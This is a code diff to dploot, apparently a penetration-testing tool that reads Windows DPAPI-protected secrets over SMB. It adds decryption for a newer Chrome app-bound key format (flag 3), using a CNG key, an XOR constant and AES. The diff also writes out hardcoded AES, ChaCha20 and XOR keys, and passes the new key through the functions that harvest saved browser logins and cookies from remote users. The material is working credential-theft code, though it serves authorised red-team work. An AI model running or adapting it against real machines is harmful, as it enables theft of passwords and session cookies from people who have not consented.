@@ -13,18 +13,17 @@ from dploot.lib.dpapi import decrypt_blob, find_masterkey_for_blob
 from dploot.lib.smb import DPLootSMBConnection
 from dploot.lib.target import Target
 from dploot.lib.masterkey import Masterkey
-from dploot.lib.crypto import decrypt_chrome_password
+from dploot.lib.crypto import CHROME_KEY_DATA_BLOB, byte_xor, decrypt_chrome_password
 from dploot.lib.utils import datetime_to_time
 from dploot.triage import Triage
 from dataclasses import dataclass
-
 
 
 class AppBoundKey(Structure):
     def __init__(self, data=None, alignment=0):
         super().__init__(data, alignment)
 
-        self._key = None
+        self.key = None
     
     structure = (
         ("PathLength", "<L=0"),
@@ -40,27 +39,41 @@ class AppBoundKey(Structure):
         print("Path:\t%s" % (self["Path"]))
         print("Key:\t%s" % (hexlify(self["Key"])))
 
-    @property
-    def key(self):
-        if self._key is not None or self["Key"] is None:
-            return self._key
+    def decrypt_key(self, cng_chromekey=None):
+        if self.key is not None or self["Key"] is None:
+            return self.key
         if len(self["Key"]) == 32:
-            self._key = self["Key"]
+            self.key = self["Key"]
         else: # from https://github.com/runassu/chrome_v20_decryption/blob/main/decrypt_chrome_v20_cookie.py
             aes_key = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
             chacha20_key = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
+            xor_key = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
+            
             flag = self["Key"][0]
-            iv = self["Key"][1:13]
-            encrypted_text = self["Key"][13:45]
-            if flag == 1:
-                cipher = AES.new(aes_key, AES.MODE_GCM, nonce=iv)
-                self._key = cipher.decrypt(ciphertext=encrypted_text)
-            elif flag == 2:
-                cipher = ChaCha20_Poly1305.new(key=chacha20_key, nonce=iv)
-                self._key = cipher.decrypt(ciphertext=encrypted_text)
+            
+            if flag == 1 or flag == 2:
+                iv = self["Key"][1:13]
+                encrypted_text = self["Key"][13:45]
+                if flag == 1:
+                    cipher = AES.new(aes_key, AES.MODE_GCM, nonce=iv)
+                elif flag == 2:
+                    cipher = ChaCha20_Poly1305.new(key=chacha20_key, nonce=iv)
+            elif flag == 3 and cng_chromekey is not None:
+                # Prepare the chromekey
+                cng_chromekey = CHROME_KEY_DATA_BLOB(cng_chromekey)["Key"]
+
+                encrypted_aes_key = self["Key"][1:33]
+                iv = self["Key"][33:45]
+                encrypted_text = self["Key"][45:77]
+                                
+                cipher = AES.new(cng_chromekey, AES.MODE_CBC, b"\x00" * 16)
+                intermediate_key = cipher.decrypt(ciphertext=encrypted_aes_key)
+                xored_intermediate_key = byte_xor(intermediate_key, xor_key)
+                cipher = AES.new(xored_intermediate_key, AES.MODE_GCM, nonce=iv)
             else:
-                raise ValueError(f"Unsupported flag: {flag}")
-        return self._key
+                raise ValueError(f"Unsupported flag: {flag}. Oops, Chrome did it again!")
+            self.key = cipher.decrypt(ciphertext=encrypted_text)
+        return self.key
     
 @dataclass
 class LoginData:
@@ -181,11 +194,11 @@ class BrowserTriage(Triage):
             per_loot_callback=per_secret_callback, 
             false_positive=false_positive
         )
-        
+
         self._users: List[str] = None
     
     def triage_browsers(
-        self, gather_cookies: bool = False, bypass_shared_violation: bool = False
+        self, gather_cookies: bool = False, bypass_shared_violation: bool = False, cng_chromekey: bytes = None
     ) -> Tuple[List[LoginData], List[Cookie]]:
         credentials = []
         cookies = []
@@ -196,6 +209,7 @@ class BrowserTriage(Triage):
                     user,
                     gather_cookies,
                     bypass_shared_violation=bypass_shared_violation,
+                    cng_chromekey=cng_chromekey,
                 )
                 credentials += user_credentials
                 cookies += user_cookies
@@ -212,11 +226,13 @@ class BrowserTriage(Triage):
         user: str,
         gather_cookies: bool = False,
         bypass_shared_violation: bool = False,
+        cng_chromekey: bytes = None,
     ) -> Tuple[List[LoginData], List[Cookie]]:
         return self.triage_chrome_browsers_for_user(
             user=user,
             gather_cookies=gather_cookies,
             bypass_shared_violation=bypass_shared_violation,
+            cng_chromekey=cng_chromekey,
         )
 
     def triage_chrome_browsers_for_user(
@@ -224,6 +240,7 @@ class BrowserTriage(Triage):
         user: str,
         gather_cookies: bool = False,
         bypass_shared_violation: bool = False,
+        cng_chromekey: bytes = None,
     ) -> Tuple[List[LoginData], List[Cookie]]:
         credentials = []
         cookies = []
@@ -270,11 +287,13 @@ class BrowserTriage(Triage):
                             if masterkey:
                                 app_bound_key = AppBoundKey(decrypt_blob(
                                     blob_bytes=intermediate_key, masterkey=masterkey
-                                )).key
+                                )).decrypt_key(cng_chromekey=cng_chromekey)
                     profiles = aesStateKey_json['profile']['profiles_order']
                 except KeyError as e:
                     logging.debug(f"Key not found! {repr(e)}")
                     # logging.debug(f"{aesStateKey_json=}")
+                except ValueError as e:
+                    logging.error(f"ValueError: {repr(e)}")
 
             for profile in profiles:
                 loginData_bytes = self.conn.readFile(
